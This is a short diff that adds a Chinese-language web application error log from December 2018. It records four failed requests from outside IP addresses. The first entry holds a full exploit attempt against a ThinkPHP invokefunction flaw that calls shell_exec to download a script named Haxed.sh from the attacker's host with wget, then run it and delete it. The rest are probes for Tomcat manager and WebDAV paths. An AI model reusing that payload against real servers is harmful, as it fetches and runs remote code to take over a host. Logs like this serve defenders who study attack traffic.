@@ -1,0 +1,12 @@
+[ 2018-12-31T09:09:37+08:00 ] 198.12.97.71 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://198.12.97.71/Haxed.sh;%20chmod%20+x%20Haxed.sh;%20sh%20Haxed.sh;rm%20-rf%20Haxed.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-31T14:51:43+08:00 ] 204.44.65.126 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2018-12-31T15:48:57+08:00 ] 134.175.44.221 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-12-31T15:50:30+08:00 ] 134.175.44.221 /manager/html
+ERR: 无法加载控制器:Manager
+
